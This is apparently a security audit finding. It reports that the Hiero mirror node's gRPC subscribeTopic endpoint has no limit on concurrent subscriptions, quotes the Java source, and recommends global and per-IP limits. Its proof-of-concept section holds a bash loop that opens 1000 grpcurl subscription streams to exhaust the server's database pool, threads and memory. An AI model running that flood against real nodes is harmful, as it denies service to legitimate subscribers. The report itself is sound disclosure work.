### Title
Unbounded Multi-Connection Subscription Flood Enables Resource Exhaustion on `subscribeTopic()`

### Summary
`ConsensusController.subscribeTopic()` accepts unlimited concurrent gRPC connections from any unauthenticated client. The only server-side guard — `maxConcurrentCallsPerConnection = 5` — is scoped per TCP connection, not per IP or identity. An attacker opening N TCP connections from the same host (using distinct source ports) multiplies that limit to N×5 simultaneous long-lived streaming subscriptions, each consuming Reactor pipeline resources, database retriever capacity, Redis listener slots, and thread-pool threads, with no enforcement ceiling.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` (lines 43–53) unconditionally creates a new Reactor subscription chain for every inbound call:

```java
// ConsensusController.java:43-48
final var disposable = Mono.fromCallable(() -> toFilter(request))
        .flatMapMany(topicMessageService::subscribeTopic)
        .map(this::toResponse)
        .onErrorMap(ProtoUtil::toStatusRuntimeException)
        .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);
```

No authentication, no IP check, no per-caller subscription count check is performed before or inside this call.

`TopicMessageServiceImpl.subscribeTopic()` (lines 59–92) allocates a `TopicContext`, starts a historical retriever Flux, a live listener Flux, and a safety-check Flux per subscription, and increments a global `AtomicLong subscriberCount` — but never enforces a maximum:

```java
// TopicMessageServiceImpl.java:88-91
return topicExists(filter)
        .thenMany(flux.doOnNext(topicContext::onNext)
                .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                .doFinally(s -> subscriberCount.decrementAndGet())
```

The only server-side connection guard is:

```java
// GrpcConfiguration.java:33
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

with a default of 5:

```java
// NettyProperties.java:14
private int maxConcurrentCallsPerConnection = 5;
```

This is a Netty HTTP/2 stream limit **per TCP connection**. It does not limit the number of TCP connections from a single IP. No `maxConnectionAge`, `maxInboundConnections`, or per-IP connection cap is configured anywhere in `GrpcConfiguration`. No `ServerInterceptor` in production code inspects the remote address or enforces a rate limit (the only interceptor found, `GrpcInterceptor`, only sets an endpoint context thread-local). The bucket4j throttling infrastructure exists exclusively in the `web3` module and is absent from the `grpc` module entirely.

The GCP gateway `maxRatePerEndpoint: 250` in the Helm chart is a per-backend-pod RPS cap for the GCP load balancer, not a per-client-IP connection limit, and is only active when the GCP gateway is enabled (`global.gateway.enabled: false` by default).

### Impact Explanation

Each active subscription holds:
- A `TopicContext` object and associated Reactor pipeline
- One or more database queries via `PollingTopicMessageRetriever` (consuming DB connection pool slots)
- A Redis or polling listener subscription via `TopicListener`
- Scheduler threads on `Schedulers.boundedElastic()` (safety-check path)

With no ceiling on total subscriptions, an attacker can exhaust the DB connection pool, saturate the bounded elastic thread pool, overflow the Redis listener's `maxBufferSize` (default 16384 messages), and consume heap until the JVM OOMs or GC pressure causes latency spikes for all legitimate subscribers. The `subscriberCount` gauge is observable in metrics but is never used to gate new subscriptions.

### Likelihood Explanation

No privileges, credentials, or special network position are required. The gRPC port (5600) is publicly exposed via the Ingress. A single attacker machine can open thousands of TCP connections (OS default ephemeral port range is ~28,000–60,000 ports) and issue 5 `subscribeTopic` calls per connection, yielding tens of thousands of concurrent subscriptions from one IP. The attack is trivially scriptable with `grpcurl`, any gRPC client library, or raw HTTP/2 tooling, and is fully repeatable.

### Recommendation

1. **Enforce a global maximum subscription count** in `TopicMessageServiceImpl.subscribeTopic()`: compare `subscriberCount.get()` against a configurable threshold and return a `RESOURCE_EXHAUSTED` gRPC status before allocating any resources.
2. **Add per-IP connection limiting** in `GrpcConfiguration` via a `ServerInterceptor` that tracks active call counts keyed by `ServerCall.getAttributes(Grpc.TRANSPORT_ATTR_REMOTE_ADDR)` and rejects calls exceeding a per-IP threshold.
3. **Configure Netty connection-level limits**: add `serverBuilder.maxConnectionAge(...)` and consider `maxInboundConnections` (available in newer Netty/gRPC versions) to bound total TCP connections.
4. **Enable the GCP gateway** (or equivalent ingress-level) per-source-IP rate limiting for production deployments.

### Proof of Concept

```bash
# Open 200 TCP connections, each with 5 concurrent subscribeTopic streams = 1000 subscriptions
for i in $(seq 1 200); do
  for j in $(seq 1 5); do
    grpcurl -plaintext \
      -d '{"topicID": {"topicNum": 1}}' \
      <mirror-node-host>:5600 \
      com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
  done
done
wait
# Observe: subscriberCount metric reaches 1000; DB connection pool exhausted;
# legitimate subscribers receive delayed or dropped messages.
```

Preconditions: network access to port 5600; no credentials needed.
Trigger: execute the script above.
Result: server resources (DB pool, threads, heap) exhausted; existing subscribers degraded or disconnected. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L43-53)
```java
    public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-15)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L87-92)
```java
        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
```
